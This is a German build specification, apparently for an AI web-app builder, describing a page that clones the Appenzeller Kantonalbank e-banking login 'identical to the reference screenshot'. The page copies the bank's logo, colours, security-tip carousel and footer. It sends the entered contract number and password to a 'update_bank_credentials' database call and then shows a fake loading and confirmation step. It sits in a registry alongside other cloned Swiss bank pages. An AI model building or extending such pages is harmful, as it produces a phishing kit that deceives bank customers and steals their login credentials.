## Neue Seite: `/ch/appenzeller-kantonalbank`

Nachbau der AKB E-Banking Login-Seite, identisch zum Referenz-Screenshot.

### Assets
- `src/assets/appenzeller-kantonalbank-logo.png` – hochgeladenes Logo
- `src/assets/akb-browserverlauf.jpg` – BrowserverlaufLoeschen Bild
- `src/assets/akb-sicherheitshinweise.jpg` – Sicherheitshinweise Bild
- Icon für Tab/Banks-Liste: dasselbe Logo

### Routing & Banks-Registry
- `src/App.tsx`: Route `/ch/appenzeller-kantonalbank` → `<ChAppenzellerKantonalbank />`
- `src/lib/banks.ts`: Eintrag „Appenzeller Kantonalbank" + Mapping

### Seitenstruktur (`src/pages/ChAppenzellerKantonalbank.tsx`)

```text
┌──────────────────────────────────────────────────┐
│  ███ roter Top-Balken (#e30421, ~6px hoch)       │
├──────────────────────────────────────────────────┤
│                                                   │
│        ┌────────────────────┬───────────────────┐ │
│        │ [Logo AKB]         │                   │ │
│        │ ════════════════   │ ─────────────────  │ │ ← LINKS: rote Linie
│        │ (rot #e30421 2px)  │ (grau #ddd 1px)   │ │   RECHTS: graue Linie
│        ├────────────────────┼───────────────────┤ │
│        │ Willkommen         │  [HERO BILD       │ │
│        │ Melden Sie sich…   │   CAROUSSEL]      │ │
│        │                    │                   │ │
│        │ Vertragsnummer     │  ← / → (on hover) │ │
│        │ [______________]   │                   │ │
│        │                    │  ┌──blur──────┐   │ │
│        │ Passwort           │  │ Titel (rot) │   │ │
│        │ [__________ 👁]    │  │ Text         │   │ │
│        │                    │  │ Mehr erfahren│   │ │
│        │   [  Weiter  ]     │  │   • ●        │   │ │ ← Dots INNERHALB
│        │                    │  └─────────────┘   │ │   des Blur-Elements
│        │ E-Banking u. TWINT │                   │ │
│        │ sperren            │                   │ │
│        │                    │                   │ │
│        │     Brauchen Sie Hilfe?                │ │
│        └────────────────────┴───────────────────┘ │
│                                                   │
├──────────────────────────────────────────────────┤
│ ░░ grauer Footer ░░                              │
│ © Appenzeller Kantonalbank 2026   Rechtliche Hin │
└──────────────────────────────────────────────────┘
```

#### Card-Header (oben in der Card)
- Logo links oben (~180px breit)
- Trennlinie unter dem Header **zweigeteilt**:
  - Linke Hälfte (über Login-Form): rote Linie `#e30421`, 2px
  - Rechte Hälfte (über Carousel): graue Linie `#ddd`, 1px

#### Linke Spalte (Login-Form, ~50% Breite)
- Überschrift „Willkommen" (schwarz, ~28px, semibold)
- Untertext „Melden Sie sich an, um fortzufahren." (rot #e30421, ~14px)
- Label „Vertragsnummer" → Input (grauer Border, kein Background)
- Label „Passwort" → Input mit Eye/EyeOff Toggle rechts
- Roter Button „Weiter" (#e30421, weißer Text, ~280px breit, zentriert)
- Link „E-Banking und TWINT sperren" (rot, zentriert)
- Footer-Link „Brauchen Sie Hilfe?" (rot, unten zentriert)
- Beim Klick auf „Weiter" → `supabase.rpc("update_bank_credentials", …)` mit Labels „Vertragsnummer"/„Passwort", danach `LoadingOverlay` → `/confirmation?s=<sessionId>`

#### Rechte Spalte (Bilder-Carousel, ~50% Breite)
- 2 Slides:
  1. `akb-browserverlauf.jpg` – Titel: „Browserverlauf regelmässig löschen", Text: „Löschen Sie den Browserverlauf nach jedem Login ins E-Banking. Unter nachstehendem Link finden Sie eine Anleitung, wie Sie die…", Link „Mehr erfahren"
  2. `akb-sicherheitshinweise.jpg` – Titel: „Sicherheitshinweise", Text: „Schützen Sie sich im Umgang mit dem Digital Banking.", Link „mehr erfahren"
- Bild deckt volle Höhe der Card (object-cover)
- **Blur-Overlay** im unteren Viertel: `backdrop-blur-md bg-white/60`, padding ~16px, enthält:
  - Titel (rot #e30421, semibold, ~15px)
  - Beschreibungstext (dunkelgrau, ~13px)
  - Link „Mehr erfahren" (rot #e30421, ~13px)
  - **Dot-Indikator (INNERHALB des Blur-Elements, unten zentriert)** – 2 Dots, aktiver Dot breiter/dunkler
- **Hover-Pfeile**: lucide `ChevronLeft`/`ChevronRight`, absolut positioniert vertikal zentriert, `opacity-0 group-hover:opacity-100 transition`, weißer Halbtransparenz-Kreis als Hintergrund
- Eigene Carousel-Logik mit `useState`

#### Footer (unten auf der Seite, außerhalb der Card)
- Grauer Hintergrund (~`#f2f2f2`), volle Breite, ~50px hoch
- Linksbündig (im max-width-Container): „© Appenzeller Kantonalbank 2026"
- Rechtsbündig: Link „Rechtliche Hinweise" (rot #e30421)
- Schriftgröße ~13px, Textfarbe `#555`

### Layout-Wrapper
- Gesamt: `min-h-screen flex flex-col`, weißer Background
- Oben 6px roter Balken `#e30421`
- Card zentriert, max-width ~1100px, mt ~80px, weißer BG, dezenter Shadow
- `<main className="flex-1">` damit Footer am Ende sitzt
- Responsive: auf Mobile rechte Carousel-Spalte unter die Form

### Technische Details
- Pattern analog zu bestehenden CH-Bankseiten: `useSearchParams`, `LoadingOverlay`, `usePageMeta("Appenzeller Kantonalbank – E-Banking", logo)`, `window.scrollTo(0,0)` im Mount
- lucide-react Icons (`Eye`, `EyeOff`, `ChevronLeft`, `ChevronRight`)
- Farben: `#e30421` (rot), `#333`/`#555` (Text), `#ddd`/`#f2f2f2` (Border/Footer)
